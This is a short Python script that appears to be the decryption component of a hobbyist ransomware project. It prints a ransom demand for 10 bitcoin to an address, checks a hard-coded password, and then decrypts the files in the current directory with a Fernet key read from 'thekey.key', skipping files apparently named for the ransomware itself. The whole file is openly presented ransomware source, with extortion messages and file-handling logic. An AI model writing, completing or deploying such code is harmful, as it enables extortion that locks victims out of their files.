#Let us do this virus
from cryptography.fernet import Fernet
import os
# should be the list with all the files that need to be decrypted

files = []

secretpassword="adhrs7551A:"
print("To decrypt your valuable files, send me 10 BTCs to this BTC Address: 8768752868526752VSGV")

userpassword=input("Enter decryption password: ")
if userpassword !=secretpassword:
	print("Sorry, wrong phrase. Send me more bitcoin.")
	exit()

#now that wea are here, he has inputed the right passwrord

for  file in os.listdir():
	# we dont want these files added 
	if file == "voldemort.exe" or file =="thekey.key" or file == "decrypt.exe":
		continue
	if os.path.isfile(file):
		
		files.append(file)


with open("thekey.key","rb") as key:
	secretkey = key.read()
for file in files:
	with open(file,"rb") as thefile:
		contents = thefile.read()
	# put the contents in the contents variable and then decrypt them using the fernet decrypt function
	contents_decrypted = Fernet(secretkey).decrypt(contents)
	#and then write them back with option wb, which overrirdes the encrypted comments
	with open (file,"wb") as thefile:
		thefile.write(contents_decrypted)


print("Congrats! All of your files have been decrypted! Thanks for getting hacked with us. Bye!")
